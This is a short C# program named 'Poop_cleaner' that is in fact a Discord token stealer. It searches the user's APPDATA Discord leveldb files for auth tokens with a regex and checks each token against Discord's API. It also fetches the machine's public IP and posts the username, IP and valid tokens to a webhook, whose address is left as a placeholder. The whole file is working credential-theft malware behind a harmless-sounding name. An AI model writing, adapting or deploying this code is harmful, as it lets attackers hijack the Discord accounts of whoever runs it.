using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Poop_cleaner
{
    class Program
    {

        static void Main(string[] args)
        {

            static bool CheckToken(string token)
            {
                try
                {
                    var http = new WebClient();
                    http.Headers.Add("Authorization", token);
                    var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                    if (!result.Contains("Unauthorized"))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                } catch
                {
                    return false;
                }
            }

            static string GrabIP()
            {
                var http = new WebClient();
                string ip = http.DownloadString("https://ip.42.pl/raw");
                return ip;
            }

            string Webhook = "hi"; // webhook yes

            string appdata = Environment.GetEnvironmentVariable("APPDATA");
            string[] directories = Directory.GetDirectories(appdata);

            foreach (var path in directories)
            {
                if (path.Contains("discord"))
                {

                    string[] local = Directory.GetDirectories(path);
                    foreach (var path1 in local)
                    {
                        if (path1.Contains("Local Storage"))
                        {
                            string[] ldb = Directory.GetFiles(path1 + "\\leveldb");

                            foreach (var ldb_file in ldb)
                            {
                                if (ldb_file.EndsWith(".ldb"))
                                {
                                    string ip = GrabIP();
                                    var text = File.ReadAllText(ldb_file);
                                    string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                                    Match token = Regex.Match(text, token_reg);
                                    if (token.Success)
                                    {
                                        if (CheckToken(token.Value))
                                        {
                                            HttpClient Http = new HttpClient();
                                            MultipartFormDataContent Payload = new MultipartFormDataContent();
                                            Payload.Add(new StringContent(Environment.UserName), "username");
                                            Payload.Add(new StringContent(string.Concat(new string[] {
                                                        "```asciidoc\n" +
                                                        "\n• ip :: ", ip,
                                                        "\n• token :: ", token.Value + "```"}
                                            )), "content");
                                            Http.PostAsync(Webhook, Payload);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
